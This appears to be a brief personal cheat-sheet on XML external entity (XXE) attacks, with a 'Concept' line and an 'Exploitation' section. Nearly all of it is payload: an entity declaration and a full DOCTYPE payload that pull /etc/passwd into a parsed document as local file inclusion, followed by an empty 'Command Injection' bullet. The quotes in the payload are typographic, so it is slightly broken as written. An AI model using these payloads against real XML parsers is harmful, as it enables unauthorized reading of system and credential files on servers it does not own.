# XXE

## Concept
```<!Entity nooranet SYSTEM “file:///etc/passwd”>```

## Exploitation
- LFI
```XML
<!DOCTYPE foo[
<!Entity xxe SYSTEM “file:///etc/passwd”>]>
<foo>&xxe;</foo>
```
- Command Injection
